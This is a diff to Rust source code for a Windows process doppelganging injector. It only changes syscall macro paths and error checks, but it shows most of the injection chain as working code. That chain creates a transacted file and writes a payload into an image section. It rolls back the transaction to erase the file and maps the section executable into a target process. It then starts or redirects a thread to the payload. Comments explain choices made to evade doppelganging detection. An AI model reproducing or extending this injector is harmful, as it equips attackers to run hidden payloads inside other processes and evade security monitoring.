@@ -415,7 +415,7 @@ unsafe fn create_transacted_file(
     // DesiredAccess: GENERIC_WRITE | SYNCHRONIZE
     // CreateDisposition: FILE_SUPERSEDE
     // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
-    let create_file_status = syscall!(
+    let create_file_status = crate::syscall!(
         "NtCreateFile",
         &mut file_handle as *mut _ as u64,               // FileHandle
         (GENERIC_WRITE | SYNCHRONIZE) as u64,             // DesiredAccess
@@ -430,7 +430,7 @@ unsafe fn create_transacted_file(
         0u64,                                              // EaBuffer = NULL
     );
 
-    if create_file_status.is_err() || create_file_status.unwrap() < 0 || file_handle == 0 {
+    if create_file_status.as_ref().map_or(true, |s| *s < 0) || file_handle == 0 {
         return Err(format!(
             "NtCreateFile for transacted temp file failed: status={:?}",
             create_file_status
@@ -450,7 +450,7 @@ unsafe fn create_transacted_file(
         information: 0,
     };
 
-    let write_status = syscall!(
+    let write_status = crate::syscall!(
         "NtWriteFile",
         file_handle as u64,                                // FileHandle
         0u64,                                              // Event = NULL
@@ -463,8 +463,8 @@ unsafe fn create_transacted_file(
         0u64,                                              // Key = NULL
     );
 
-    if write_status.is_err() || write_status.unwrap() < 0 {
-        let _ = syscall!("NtClose", file_handle as u64);
+    if write_status.as_ref().map_or(true, |s| *s < 0) {
+        let _ = crate::syscall!("NtClose", file_handle as u64);
         return Err(format!(
             "NtWriteFile for transacted temp file failed: status={:?}",
             write_status
@@ -494,7 +494,7 @@ unsafe fn write_payload_to_file(file_handle: usize, payload: &[u8]) -> Result<()
 
     // Write payload starting at offset 0 (overwriting the placeholder zeros).
     let mut byte_offset: i64 = 0;
-    let write_status = syscall!(
+    let write_status = crate::syscall!(
         "NtWriteFile",
         file_handle as u64,                                // FileHandle
         0u64,                                              // Event = NULL
@@ -507,7 +507,7 @@ unsafe fn write_payload_to_file(file_handle: usize, payload: &[u8]) -> Result<()
         0u64,                                              // Key = NULL
     );
 
-    if write_status.is_err() || write_status.unwrap() < 0 {
+    if write_status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtWriteFile for payload failed: status={:?}",
             write_status
@@ -538,7 +538,7 @@ unsafe fn create_section_from_file(file_handle: usize, payload_size: usize) -> R
     // avoids creating an RWX-backed section object — the single most suspicious
     // NtCreateSection argument for doppelganging detection.  The section object's
     // maximum protection allows both RW and RX views.
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtCreateSection",
         &mut h_section as *mut _ as u64,               // SectionHandle
         SECTION_ALL_ACCESS,                             // DesiredAccess
@@ -549,7 +549,7 @@ unsafe fn create_section_from_file(file_handle: usize, payload_size: usize) -> R
         file_handle as u64,                             // FileHandle (transacted file)
     );
 
-    if status.is_err() || status.unwrap() < 0 || h_section == 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) || h_section == 0 {
         return Err(format!(
             "NtCreateSection for doppelganging section failed: status={:?}",
             status
@@ -572,7 +572,7 @@ unsafe fn write_payload_to_section(
     let mut local_base: *mut c_void = std::ptr::null_mut();
     let mut view_size: usize = 0;
 
-    let map_status = syscall!(
+    let map_status = crate::syscall!(
         "NtMapViewOfSection",
         h_section as u64,
         CURRENT_PROCESS,                  // NtCurrentProcess()
@@ -586,7 +586,7 @@ unsafe fn write_payload_to_section(
         PAGE_READWRITE,
     );
 
-    if map_status.is_err() || map_status.unwrap() < 0 || local_base.is_null() {
+    if map_status.as_ref().map_or(true, |s| *s < 0) || local_base.is_null() {
         return Err(format!(
             "NtMapViewOfSection(local RW) failed: status={:?}",
             map_status
@@ -597,7 +597,7 @@ unsafe fn write_payload_to_section(
     std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, payload.len());
 
     // Unmap from our process — the section object retains the data.
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtUnmapViewOfSection",
         CURRENT_PROCESS,
         local_base as u64,
@@ -624,7 +624,7 @@ unsafe fn map_section_to_process(
     let mut remote_base: *mut c_void = std::ptr::null_mut();
     let mut view_size: usize = 0;
 
-    let map_status = syscall!(
+    let map_status = crate::syscall!(
         "NtMapViewOfSection",
         section_handle as u64,
         process_handle as u64,
@@ -638,7 +638,7 @@ unsafe fn map_section_to_process(
         PAGE_EXECUTE_READ,
     );
 
-    if map_status.is_err() || map_status.unwrap() < 0 || remote_base.is_null() {
+    if map_status.as_ref().map_or(true, |s| *s < 0) || remote_base.is_null() {
         return Err(format!(
             "NtMapViewOfSection(remote RX) failed: status={:?}",
             map_status
@@ -667,7 +667,7 @@ unsafe fn find_process_by_name(name: &str) -> Result<u32, String> {
     let mut buf_size: usize = 0;
 
     // First call to get required buffer size (will return STATUS_INFO_LENGTH_MISMATCH).
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtQuerySystemInformation",
         5u64,                              // SystemProcessInformation
         0u64,                              // null buffer
@@ -681,7 +681,7 @@ unsafe fn find_process_by_name(name: &str) -> Result<u32, String> {
     let mut return_length: usize = 0;
     for _ in 0..3 {
         buffer.resize(buf_size + 4096, 0);
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtQuerySystemInformation",
             5u64,                                  // SystemProcessInformation
             buffer.as_mut_ptr() as u64,            // Buffer
@@ -742,7 +742,7 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
     obj_attr.length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
         MINIMAL_PROCESS_ACCESS as u64,
@@ -750,7 +750,7 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
         client_id.as_mut_ptr() as u64,
     );
 
-    if status.is_err() || status.unwrap() < 0 || h_proc == 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) || h_proc == 0 {
         return Err(format!(
             "NtOpenProcess({}) failed: status={:?}",
             pid, status
@@ -866,7 +866,7 @@ unsafe fn execute_payload(
     //   IN SIZE_T MaximumStackSize,
     //   IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
     // )
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtCreateThreadEx",
         &mut thread_handle as *mut _ as u64,  // ThreadHandle
         THREAD_INJECT_ACCESS,                         // DesiredAccess (minimal)
@@ -881,7 +881,7 @@ unsafe fn execute_payload(
         0u64,                                   // AttributeList = NULL
     );
 
-    if status.is_err() || status.unwrap() < 0 || thread_handle == 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) || thread_handle == 0 {
         return Err(format!(
             "NtCreateThreadEx failed: status={:?}",
             status
@@ -912,12 +912,12 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
     ctx.context_flags = crate::win_types::CONTEXT_FULL;
 
     // NtGetContextThread(ThreadHandle, pContext)
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtGetContextThread",
         thread_handle as u64,
         &mut ctx as *mut CONTEXT as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtGetContextThread failed: status={:?}",
             status
@@ -927,12 +927,12 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
     ctx.rip = payload_addr as u64;
 
     // NtSetContextThread(ThreadHandle, pContext)
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtSetContextThread",
         thread_handle as u64,
         &ctx as *const CONTEXT as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtSetContextThread failed: status={:?}",
             status
@@ -948,13 +948,13 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
 
 /// Resume a suspended thread via `NtResumeThread`.
 unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtResumeThread",
         thread_handle as u64,
-        std::ptr::null_mut() as u64, // PreviousSuspendCount = NULL
+        0u64, // PreviousSuspendCount = NULL
     );
 
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtResumeThread failed: status={:?}",
             status
@@ -1013,7 +1013,7 @@ pub unsafe fn doppelganging_inject(
     // The file is created within the transaction and populated with zeros.
     let file_handle = create_transacted_file(tx_handle, payload.len())
         .map_err(|e| {
-            let _ = syscall!("NtClose", tx_handle as u64);
+            let _ = crate::syscall!("NtClose", tx_handle as u64);
             e
         })?;
 
@@ -1021,8 +1021,8 @@ pub unsafe fn doppelganging_inject(
     // Overwrite the placeholder zeros with the actual payload.
     write_payload_to_file(file_handle, payload)
         .map_err(|e| {
-            let _ = syscall!("NtClose", file_handle as u64);
-            let _ = syscall!("NtClose", tx_handle as u64);
+            let _ = crate::syscall!("NtClose", file_handle as u64);
+            let _ = crate::syscall!("NtClose", tx_handle as u64);
             e
         })?;
 
@@ -1030,14 +1030,14 @@ pub unsafe fn doppelganging_inject(
     // The section now holds a snapshot of the file data.
     let h_section = create_section_from_file(file_handle, payload.len())
         .map_err(|e| {
-            let _ = syscall!("NtClose", file_handle as u64);
-            let _ = syscall!("NtClose", tx_handle as u64);
+            let _ = crate::syscall!("NtClose", file_handle as u64);
+            let _ = crate::syscall!("NtClose", tx_handle as u64);
             e
         })?;
     let h_section_guard = crate::nt_handle::NtHandle::new(h_section);
 
     // Close the file handle — the section holds its own reference.
-    let _ = syscall!("NtClose", file_handle as u64);
+    let _ = crate::syscall!("NtClose", file_handle as u64);
 
     // ── Step 5: Roll back the transaction ─────────────────────────────
     // KEY INSIGHT: Rolling back the transaction deletes the temp file from
@@ -1056,7 +1056,7 @@ pub unsafe fn doppelganging_inject(
         }
     }
 
-    let _ = syscall!("NtClose", tx_handle as u64);
+    let _ = crate::syscall!("NtClose", tx_handle as u64);
 
     // ── Step 6: Open or create target process ─────────────────────────
     let (process_handle, thread_handle, pid, is_suspended) = match target_process {
@@ -1089,15 +1089,15 @@ pub unsafe fn doppelganging_inject(
     // a file that no longer exists on disk.
     let remote_base = map_section_to_process(h_section_guard.raw(), process_handle).map_err(|e| {
         if is_suspended {
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtTerminateProcess",
                 process_handle as u64,
                 1u64
             );
         }
-        let _ = syscall!("NtClose", process_handle as u64);
+        let _ = crate::syscall!("NtClose", process_handle as u64);
         if thread_handle != 0 {
-            let _ = syscall!("NtClose", thread_handle as u64);
+            let _ = crate::syscall!("NtClose", thread_handle as u64);
         }
         // h_section_guard dropped here — NtClose via Drop
         e
@@ -1116,7 +1116,7 @@ pub unsafe fn doppelganging_inject(
     // instructions may be executed without this flush.  Non-fatal: log
     // and continue regardless of return value.
     {
-        let flush_status = syscall!(
+        let flush_status = crate::syscall!(
             "NtFlushInstructionCache",
             process_handle as u64,
             remote_base as u64,
